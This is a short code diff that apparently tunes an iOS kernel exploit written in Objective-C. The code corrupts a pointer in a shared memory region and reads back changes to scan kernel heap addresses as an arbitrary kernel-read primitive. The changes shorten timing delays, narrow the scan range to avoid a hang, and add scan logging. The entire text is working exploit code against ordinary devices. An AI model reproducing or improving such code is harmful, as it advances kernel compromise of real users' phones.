@@ -342,7 +342,7 @@ static BOOL isKernelPointer(uint64_t v) {
 
             // Restore
             rp[i] = v;
-            usleep(500);
+            usleep(100);
         }
 
         free(orig);
@@ -406,7 +406,7 @@ static BOOL isKernelPointer(uint64_t v) {
                 if (p[j] != snap[j]) diffs++;
             }
             p[i] = v;
-            usleep(500);
+            usleep(100);
 
             if (diffs > 0) {
                 diffKptr = v;
@@ -452,10 +452,13 @@ found_kptr:
         int found = 0;
 
         // Try reading at 64KB intervals in kernel heap range
-        for (uint64_t target = 0xffffffe000000000ULL; target < 0xffffffe100000000ULL && !found; target += 0x10000) {
+        // Reduced range: 256KB scan to avoid hang
+        uint64_t scanBase = 0xffffffe000000000ULL;
+        for (uint64_t target = scanBase; target < scanBase + 0x40000 && !found; target += 0x1000) {
+            [self journal:[NSString stringWithFormat:@"kread scan: 0x%llx", target]];
             // Replace diffKptr with target
             rp[diffKptrOff / 8] = target;
-            usleep(500);
+            usleep(100);
 
             // Read output diffs
             for (size_t j = 0; j < rwords; j++) {
@@ -476,7 +479,7 @@ found_kptr:
 
             // Restore
             rp[diffKptrOff / 8] = diffKptr;
-            usleep(200);
+            usleep(50);
         }
 
         memcpy((void *)diffRegion, base_snap, scanSize);
